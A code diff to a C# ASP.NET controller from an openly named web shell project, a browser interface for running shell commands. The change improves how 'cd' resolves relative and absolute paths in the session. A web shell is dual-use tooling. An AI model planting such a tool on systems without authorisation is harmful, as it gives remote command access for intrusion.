@@ -21,6 +21,7 @@ namespace WebShell.Controllers
 
         public IActionResult Index()
         {
+            HttpContext.Session.SetString("path", Environment.CurrentDirectory);
             return View();
         }
 
@@ -33,7 +34,24 @@ namespace WebShell.Controllers
             
             if (commSplitted.Length > 1 && commSplitted[0] == "cd")
             {
-                HttpContext.Session.SetString("path", commSplitted[1]);
+                var currentPath = commSplitted[1];
+                if (Path.IsPathRooted(currentPath) && Directory.Exists(currentPath))
+                {
+                    HttpContext.Session.SetString("path", currentPath);
+                }
+                else
+                {
+                    var temp = Path.GetFullPath(
+                                        Path.Combine(
+                                            HttpContext.Session.GetString("path"), 
+                                            currentPath) 
+                                    );
+
+                    if (Directory.Exists(temp))
+                    {
+                        HttpContext.Session.SetString("path", temp);
+                    }
+                }
             }
 
             var path = HttpContext.Session.GetString("path") ?? Environment.CurrentDirectory;
@@ -41,7 +59,7 @@ namespace WebShell.Controllers
             
             return new[]{ output, Path.GetFullPath(path) };
         }
-
+        
         private string ResponseBeautifier(string response)
         {
             return response.Replace("<", "&lt;")
